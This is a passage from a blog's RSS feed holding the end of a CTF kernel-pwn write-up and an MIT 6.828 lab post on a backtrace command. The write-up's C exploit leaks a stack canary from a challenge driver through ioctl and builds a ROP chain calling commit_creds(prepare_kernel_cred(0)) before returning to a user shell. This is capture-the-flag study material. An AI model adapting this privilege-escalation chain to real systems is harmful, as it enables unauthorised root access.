-F&#x27; &#x27; &#x27;&#123;print $1&#125;&#x27;&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="built_in">fscanf</span>(base,<span class="string">&quot;%p&quot;</span>,&amp;base_addr);</span><br><span class="line">    commit_creds=base_addr+<span class="number">0x9c8e0</span>;</span><br><span class="line">    prepare_kernel_cred=base_addr+<span class="number">0x9cce0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;commit_creds is %p \nbase is %p \nprepare is %p\n&quot;</span>,commit_creds,base_addr,prepare_kernel_cred);</span><br><span class="line"></span><br><span class="line">    fclose(base);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_WRONLY);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open core failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>); <span class="comment">//set offset</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> canary[<span class="number">2</span>];</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,canary); <span class="comment">//get canary</span></span><br><span class="line">    <span class="comment">//printf(&quot;ret addr is %lx\n&quot;,canary[2]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]canary is %lx\n&quot;</span>,canary[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]ebp is %p\n&quot;</span>,canary[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> payload[<span class="number">0x40</span>];</span><br><span class="line">payload[<span class="number">0</span>]=<span class="number">0x6666666666666666</span>;</span><br><span class="line"></span><br><span class="line">    payload[<span class="number">8</span>]=canary[<span class="number">0</span>]; <span class="comment">//canary</span></span><br><span class="line">    payload[<span class="number">9</span>]=canary[<span class="number">1</span>]; <span class="comment">//rbp</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* mov_rdi_rax_jmp_rdx=base_addr+<span class="number">0x6a6d2</span>;</span><br><span class="line">    <span class="keyword">void</span>* pop_rdx_ret=base_addr+<span class="number">0xa0f49</span>;</span><br><span class="line">    <span class="keyword">void</span>* pop_rdi_ret=base_addr+<span class="number">0xb2f</span>;</span><br><span class="line">    <span class="keyword">void</span>* swapgs=base_addr+<span class="number">0xa012da</span>;</span><br><span class="line">    <span class="keyword">void</span>* iretq=base_addr+<span class="number">0x50ac2</span>;</span><br><span class="line"></span><br><span class="line">    payload[<span class="number">10</span>] = pop_rdi_ret; <span class="comment">//pop rdi;ret</span></span><br><span class="line">    payload[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">    payload[<span class="number">12</span>] = prepare_kernel_cred; <span class="comment">//prepare_kernel_cred(0);</span></span><br><span class="line">    payload[<span class="number">13</span>] = pop_rdx_ret; <span class="comment">//pop rdx;ret</span></span><br><span class="line">    payload[<span class="number">14</span>] = commit_creds; <span class="comment">//commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line">    payload[<span class="number">15</span>] = mov_rdi_rax_jmp_rdx; <span class="comment">//mov rdi, rax; call rdx;</span></span><br><span class="line">    payload[<span class="number">16</span>] = swapgs; <span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">    payload[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">    payload[<span class="number">18</span>] = iretq; <span class="comment">//iretq; ret; </span></span><br><span class="line">    payload[<span class="number">19</span>] = binsh;</span><br><span class="line">    payload[<span class="number">20</span>] = user_cs;</span><br><span class="line">    payload[<span class="number">21</span>] = user_rflags;</span><br><span class="line">    payload[<span class="number">22</span>] = user_sp;</span><br><span class="line">    payload[<span class="number">23</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd,payload,<span class="number">0x200</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xf000000000000000</span>+<span class="number">24</span>*<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13248098511/0" alt="image-20210306163253674"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h2&gt;&lt;p&gt;首先到手几个文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://inews.gtimg.com/newsapp_ls/0/1324754
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="Kernel Pwn" scheme="https://billyotry.github.io/tags/Kernel-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【MIT6.828】Lab1-Exercise12</title>
    <link href="https://billyotry.github.io/2021/03/05/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise12/"/>
    <id>https://billyotry.github.io/2021/03/05/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise12/</id>
    <published>2021-03-05T02:54:09.075Z</published>
    <updated>2021-03-05T02:59:36.718Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>实现<code>backtrace</code>命令</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们需要查询STAB（Symbol TABLE）的知识来完成此内容</p><p>在<code>kdebug.c</code>中添加如下片段来获取函数行号：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">stab_binsearch(stabs, &amp;lline, &amp;rline, N_SLINE, addr);</span><br><span class="line">info-&gt;eip_line = stabs[lline].n_desc;</span><br></pre></td></tr></table></figure><p>在<code>monitor.c</code>中添加<code>backtrace</code>函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">backtrace(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span>* ebp = (<span class="keyword">int</span> *)read_ebp();</span><br><span class="line">    cprintf(<span class="string">&quot;Stack backtrace:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(ebp)&#123;</span><br><span class="line">        cprintf(<span class="string">&quot;  ebp %08x&quot;</span>,ebp);</span><br><span class="line">        cprintf(<span class="string">&quot;  eip %08x&quot;</span>,*(ebp+<span class="number">1</span>));</span><br><span class="line">        cprintf(<span class="string">&quot;  args&quot;</span>);</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">2</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">3</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">4</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">5</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x\n&quot;</span>,*(ebp+<span class="number">6</span>));</span><br><span class="line">        ebp = (<span class="keyword">int</span>*) *ebp;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Eipdebuginfo</span> *<span class="title">info</span>;</span></span><br><span class="line">        <span class="keyword">int</span> eip = *(ebp+<span class="number">1</span>);</span><br><span class="line">        debuginfo_eip(eip,&amp;info);</span><br><span class="line">        cprintf(<span class="string">&quot;\t%s:%d: %.*s+%d\n&quot;</span>, </span><br><span class="line">      info.eip_file, info.eip_line,</span><br><span class="line">      info.eip_fn_namelen, info.eip_fn_name,</span><br><span class="line">      eip-info.eip_fn_addr);</span><br><span class="line">        ebp = (<span class="keyword">int</span>*)*ebp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;实现&lt;code&gt;backtrace&lt;/code&gt;命令&lt;/p&gt;
&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
</feed>
